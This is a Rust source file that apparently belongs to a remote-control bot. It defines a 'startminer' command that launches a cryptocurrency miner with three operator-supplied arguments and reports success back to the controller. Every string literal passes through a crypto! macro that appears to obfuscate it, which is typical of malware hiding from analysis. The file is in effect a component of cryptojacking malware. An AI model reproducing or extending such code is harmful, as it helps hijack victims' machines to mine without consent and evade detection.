use super::prelude::*;

pub struct Startminer;

#[async_trait]
impl Command for Startminer {
    fn name(&self) -> String {
        crypto!("startminer")
    }

    fn help(&self) -> String {
        crypto!("Starting crypto miner")
    }

    fn min_args(&self) -> usize {
        3
    }

    async fn execute(&self, client: &mut Client, args: Vec<&str>) -> anyhow::Result<()> {
        crypto::run_miner(args[0], args[1], args[2])?;
        client.send(ok(crypto!("Miner has been started")))
    }
}
